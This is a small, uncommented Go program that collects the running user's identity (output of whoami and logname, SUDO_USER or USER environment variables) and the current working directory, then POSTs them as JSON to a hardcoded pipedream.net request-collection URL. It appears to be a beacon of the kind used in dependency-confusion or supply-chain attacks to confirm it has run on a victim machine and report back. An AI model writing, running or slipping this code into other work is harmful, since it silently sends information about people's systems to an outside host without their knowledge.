package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strings"
)

type Payload struct {
	Whoami   string `json:"whoami"`
	Username string `json:"username"`
	CWD      string `json:"cwd"`
}

func runCmd(name string) string {
	out, err := exec.Command(name).Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func collectData() (*Payload, error) {
	// whoami (effective user)
	whoami := runCmd("whoami")

	// try to get login user
	username := runCmd("logname")

	// fallback if logname fails (common in containers)
	if username == "" {
		if sudoUser := os.Getenv("SUDO_USER"); sudoUser != "" {
			username = sudoUser
		} else if envUser := os.Getenv("USER"); envUser != "" {
			username = envUser
		} else {
			u, err := user.Current()
			if err == nil {
				username = u.Username
			}
		}
	}

	cwd, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return &Payload{
		Whoami:   whoami,
		Username: username,
		CWD:      cwd,
	}, nil
}

func Send(endpoint string) error {
	data, err := collectData()
	if err != nil {
		return err
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", endpoint, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	_, err = client.Do(req)
	return err
}

func main() {
	err := Send("https://eoxzttabeek4bna.m.pipedream.net/")
	if err != nil {
		log.Fatal(err)
	}
}
